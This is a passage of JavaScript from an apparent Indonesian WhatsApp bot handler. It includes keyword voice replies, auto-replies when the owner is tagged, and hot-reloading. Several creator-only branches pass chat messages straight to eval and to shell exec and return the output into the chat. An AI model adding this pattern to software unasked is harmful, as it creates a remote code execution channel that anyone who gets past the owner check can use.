let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await reply(evaled)
} catch (err) {
reply(String(err))
}
}

if (budy.startsWith('<')) {
if (!isCreator) return 
try {
return reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
if (budy.startsWith('$')){
if (!isCreator) return 
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (!m.isGroup && sendbot.includes(messagesC)) {
sendvn(ucapbot)
}
if (!m.isGroup && tdksopan.includes(messagesC)) {
sendvn(sopankek)
}
}
if (!isCreator && budy.includes(nomerOwner)) {
const kta = ['Bentar Ya Kak Nanti Juga Di Bales Sama Ownerku 😉', 'Tunggu Aja Kak, Entar Juga Di Bales 😁', 'Iya Kak, Ada Apa Tag Owner Aku Nih 🙂']
const su = kta[Math.floor(Math.random() * kta.length)]
m.reply(su)
}
if (!m.isGroup && budy.includes(`ualaikum`) || budy.includes(`u'alaikum`)) {
sendvn(walaikumsalam)
}
} catch (err) {
m.reply(util.format(err))
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
    fs.unwatchFile(file)
    console.log(chalk.redBright(`Update ${__filename}`))
    delete require.cache[file]
    require(file)
})